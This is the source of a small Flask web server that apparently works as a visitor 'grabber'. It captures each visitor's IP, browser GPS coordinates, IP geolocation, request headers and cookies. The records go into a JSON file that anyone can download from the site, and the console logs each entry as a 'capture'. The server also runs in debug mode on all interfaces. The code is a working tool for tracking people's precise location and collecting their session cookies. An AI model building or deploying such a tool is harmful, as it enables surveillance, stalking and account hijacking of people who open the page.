from flask import Flask, request, render_template, jsonify, send_from_directory
import requests
import json
import os
from datetime import datetime

app = Flask(__name__)

DATA_FILE = "howdy.json"

def get_client_ip():
    if "CF-Connecting-IP" in request.headers:
        return request.headers["CF-Connecting-IP"]
    if "X-Forwarded-For" in request.headers:
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    return request.remote_addr

def get_location(ip):
    try:
        url = f"https://ipapi.co/{ip}/json/"
        response = requests.get(url, timeout=5)
        return response.json()
    except:
        return {"ip": ip, "note": "Geo-lookup failed"}

def save_data(data):
    content = []
    if not os.path.exists(DATA_FILE) or os.path.getsize(DATA_FILE) == 0:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump([], f)
    
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            content = json.load(f)
            if not isinstance(content, list):
                content = []
    except (json.JSONDecodeError, IOError):
        content = []

    content.append(data)
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(content, f, indent=4, ensure_ascii=False)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/howdy.json")
def download_logs():
    if os.path.exists(DATA_FILE):
        return send_from_directory(os.getcwd(), DATA_FILE)
    return jsonify({"error": "No data collected yet"}), 404

@app.route("/collect", methods=["POST"])
def collect():
    try:
        ip = get_client_ip()
        location_api = get_location(ip)
        browser_data = request.json

        gps_info = browser_data.get("gps", {})
        
        data_to_save = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip_address": ip,
            "gps_real": {
                "latitude": gps_info.get("latitude"),
                "longitude": gps_info.get("longitude"),
                "error": gps_info.get("error")
            },
            
            "geolocation_ip_api": location_api,
            "request_headers": dict(request.headers),
            "cookies": dict(request.cookies),
            "browser_report": browser_data
        }

        save_data(data_to_save)
        
        print(f"[*] Captura realizada: IP {ip} | GPS: {gps_info.get('latitude')}, {gps_info.get('longitude')}")
        
        return jsonify({"status": "ok"})
    except Exception as e:
        print(f"[!] Erro na coleta: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)